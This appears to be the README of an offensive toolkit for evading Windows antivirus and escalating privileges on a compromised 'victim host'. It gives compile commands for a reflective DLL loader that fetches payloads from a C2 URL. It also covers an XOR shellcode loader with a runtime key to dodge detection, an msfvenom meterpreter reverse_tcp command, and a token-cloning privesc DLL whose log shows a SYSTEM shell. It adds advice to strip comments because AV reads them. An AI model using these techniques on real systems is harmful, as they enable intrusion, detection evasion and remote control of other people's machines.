# DumbAV is a collection AV bypass methods. 
This is a mish-mash of some of the methods I've leveraged by bypass AV and end-point controls in Windows environments. This assumes that you have an established command execution foothold on a victim host and need to elevate privileges. These are not novel techniques, just repackated ideas that have been around for a while. 

* remote_dll_loader.exe - This program loads a DLL from a provided URL into memory and executes it. No touching disk, which is nice.
* xor_loader_dll.c - This DLL loads XOR encrypted shellcode from hamdinger_data.h and executes it. Pairs well with remote_dll_loader.exe.
* xor_encrypt.py - This Python script converts raw shellcode into an XOR encrypted char array stored in the header, hamdinger_data.h.
* privesc_dll.c - This DLL uses the SeDebugPrivilege and token cloning to (hopefully) launch an elevated process. Pairs well with remote_dll_loader.exe

## Do these work?
Absolutely, maybe! Some of these methods are long in the tooth, but provide a good baseline for control validatio. remote_dll_loader.exe is almost univesrally ignored by AV. It's the remotely hosted DLLs it helps execute that tend to trigger an alert. 

## How do I use these? 

I compile all of the Windows DLLs in Linux with x86_64-w64-mingw32-gcc. Most of the *.c files have comments in them that you'll want to remove before compiling. Don't give the game up, AV reads them too. Here's the basic run down of how these puzzle pieces fit together. 

### Remote DLL Loader

Lets start with most versitle remote_dll_loader.c. This program accepts as an argument a URL or local file that (your C2) that points to a DLL you'd like to run on your victim machine. 

Compile to EXE:

```
$ x86_64-w64-mingw32-gcc remote_dll_loader.c -o remote_dll_loader.exe -lwininet
```

You can also just grab the pre-compiled binary. From there you can uplaod the binary to the victim, for example using SMBMap. While you're at it upload the privesc.dll as well.

```
C:\Users\shawnevans>whoami
shawnevans-pc\shawnevans

C:\Users\shawnevans>remote_dll_loader.exe privesc.dll
[+] Target identified as local file. Reading...
[+] Data acquired (434177 bytes). Starting reflective load...
Allocated target memory base: 0x0000000001c50000
Successfully mapped headers and sections.
Applying base relocations. Delta: 0xFFFFFFFD46D60000
Base relocations applied successfully.
Successfully resolved Import Address Table (IAT).
Analyzing cat paw entry point at 0x1C51350...
--- PrivEsc Operation Started ---
[+] SeDebugPrivilege enabled successfully.
[+] Found services.exe with PID: 492
[***] SUCCESS: Launched SYSTEM cmd.exe! PID: 2196
This finished. That returned: 1
```

A new cmd.exe window pops up and check that out, we've elevated.

```
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

### XOR Loader

The XOR loader method is nice, mainly because it's simple. The general scenario is that we want to execute a Metasploit payload. AV hates Metasploit payloads, so we need to introduce an intermediary. We do this by way of XOR encoding raw shellcode from msfvenom. 

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Listening Port> -f raw -o yanky.doodle
```

Now that we have our raw shellcode stored in "yanky.doodle" we can use the xor_encrypt.py script generate a C header file that contains the XOR encrypted shellcode stored as a char array. 

Note: The one thing to know about the way the XOR shellcode loader works is that the key used to decrypt the payload is generated partially at runtime via the current system year. For example if you define a key "ImALoser" using xor_encrypt.py, the actual decryption key is "ImALoser2026". Elegant, I know. This way the DLL doesn't contain the complete key as hardcoded string, only the fragment "ImALoser". I'm sure there is a bettter way to do this, but this is simple and works. 

```
$ ./xor_encrypt.py -i yanky.doodle -k ImALoser

--- Encryption Summary ---
Input File: yanky.doodle
Output File: hamdinger_data.h
Hardcoded Key Part: 'ImALoser'
Dynamic Year Part: '2026'
Full Encryption Key: 'ImALoser2026' (Length: 12)
Payload Length: 510 bytes
--------------------------
Successfully generated hamdinger_data.h.
```

Now, we go to the xor_laoder.c source, which needs to be edited (or not if you went with the default key of LudicrousGibs). Just change the HARDCODED_KEY_PART value to whatever you input into xor_encrypt.py.

```
  28 #include "hamdinger_data.h"
  29 
  30 #define HARDCODED_KEY_PART "ImALoser"
  31 #define MAX_KEY_LEN 100
  32 
```

Now lets compile it. You can do this as an EXE or a DLL. I'm going to use it with the remote_dll_loader.exe so I'll compile as a DLL. If you compile as an EXE, it's basically a few steps removed from a vanilla MSF payload - higher chance it gets popped. 

```
$ x86_64-w64-mingw32-gcc xor_loader.c -shared -o hamdinger.dll
```

From here you can just use the remote_dll_loader.exe program to relfectively load an execute the DLL. With any luck your MSF payload will happily run in memory and you get a nice Metasploit session open. 





